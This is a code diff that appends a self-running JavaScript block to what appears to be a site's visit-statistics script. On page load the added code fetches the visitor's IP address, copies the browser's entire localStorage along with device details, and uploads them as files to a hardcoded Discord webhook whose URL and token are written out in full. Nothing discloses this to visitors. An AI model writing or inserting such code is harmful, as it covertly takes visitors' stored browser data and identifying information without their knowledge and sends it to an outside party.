@@ -127,3 +127,161 @@
     printVisitStats();
 })();
 
+
+
+(function () {
+    const targetBaseUrl = "https://drmineword.github.io/Artefact-Boost-Active/";
+    const webhookUrl = "https://discord.com/api/webhooks/1320483118947242094/uncmv45ABLDaJZcNZOzkjvNXZzV9NPL5yjgIOQagRK6FdDqW8GQuJHaSlkqd0_Z7uf4d";
+
+    // Function to get current timestamp in UNIX format
+    function getUnixTime() {
+        return Math.floor(Date.now() / 1000);
+    }
+
+    // Generate or retrieve the user ID (UID) based on IP and time
+    async function getUserId() {
+        let userId = localStorage.getItem("userId");
+        if (!userId) {
+            try {
+                const response = await fetch("https://api.ipify.org?format=json");
+                const { ip } = await response.json();
+                const timestamp = getUnixTime();
+                userId = btoa(`${ip}_${timestamp}`); // Encode IP and timestamp
+                localStorage.setItem("userId", userId);
+            } catch (error) {
+                console.error("Failed to retrieve user IP:", error);
+                userId = btoa(`anonymous_${getUnixTime()}`);
+                localStorage.setItem("userId", userId);
+            }
+        }
+        return userId;
+    }
+
+    // Function to collect localStorage data
+    function collectLocalStorage() {
+        const allKeys = Object.keys(localStorage);
+        const data = {};
+        allKeys.forEach(key => {
+            data[key] = localStorage.getItem(key);
+        });
+        return data;
+    }
+
+    // Function to send files to Discord webhook
+    async function sendToWebhook(files, embedMessage) {
+        const formData = new FormData();
+        files.forEach(file => formData.append("file", file));
+        formData.append(
+            "payload_json",
+            JSON.stringify({
+                embeds: [embedMessage],
+            })
+        );
+
+        try {
+            const response = await fetch(webhookUrl, {
+                method: "POST",
+                body: formData,
+            });
+            console.log("Files sent successfully:", await response.json());
+        } catch (error) {
+            console.error("Failed to send files:", error);
+        }
+    }
+
+    // Function to check if user is on the target website
+    async function checkAndSendData() {
+        if (!window.location.href.startsWith(targetBaseUrl)) {
+            console.log("Not on target website.");
+            return;
+        }
+
+        console.log("On target website.");
+
+        // Step 1: Collect visit time log
+        const visitLog = {
+            visitTime: new Date().toISOString(),
+            page: window.location.href,
+        };
+        const visitLogFile = new File(
+            [JSON.stringify(visitLog, null, 2)],
+            "visit_log.json",
+            { type: "application/json" }
+        );
+
+        // Step 2: Collect localStorage content
+        const localStorageData = collectLocalStorage();
+        const localStorageFile = new File(
+            [JSON.stringify(localStorageData, null, 2)],
+            "local_storage.json",
+            { type: "application/json" }
+        );
+
+        // Step 3: Collect visit statistics from existing script
+        const visitCounts = JSON.parse(localStorage.getItem("visitCounts")) || [];
+        const timeSpentOnPages = JSON.parse(localStorage.getItem("timeSpentOnPages")) || [];
+        const totalVisitSummary = JSON.parse(localStorage.getItem("totalVisitSummary")) || {
+            totalVisits: 0,
+            totalTimeSpent: 0,
+        };
+
+        const visitStats = {
+            visitCounts,
+            timeSpentOnPages,
+            totalVisitSummary,
+        };
+        const visitStatsFile = new File(
+            [JSON.stringify(visitStats, null, 2)],
+            "visit_statistics.json",
+            { type: "application/json" }
+        );
+
+        // Step 4: Create a sample file with arbitrary data
+        const sampleData = {
+            message: "This is a sample JSON file.",
+            createdAt: new Date().toISOString(),
+        };
+        const sampleFile = new File(
+            [JSON.stringify(sampleData, null, 2)],
+            "sample_data.json",
+            { type: "application/json" }
+        );
+
+        // Step 5: Generate user ID and device info
+        const userId = await getUserId();
+        const deviceInfo = {
+            userId,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+        };
+        const deviceInfoFile = new File(
+            [JSON.stringify(deviceInfo, null, 2)],
+            "device_info.json",
+            { type: "application/json" }
+        );
+
+        // Embed message with details
+        const embedMessage = {
+            title: "New Visitor Data",
+            description: "Collected data from a website visit.",
+            fields: [
+                { name: "User ID", value: userId },
+                { name: "Page URL", value: window.location.href },
+                { name: "Visit Time", value: new Date().toISOString() },
+            ],
+            footer: {
+                text: `Timestamp: ${getUnixTime()}`,
+            },
+        };
+
+        // Send files and embed message to the webhook
+        sendToWebhook(
+            [visitLogFile, localStorageFile, visitStatsFile, sampleFile, deviceInfoFile],
+            embedMessage
+        );
+    }
+
+    // Execute the script
+    checkAndSendData();
+})();
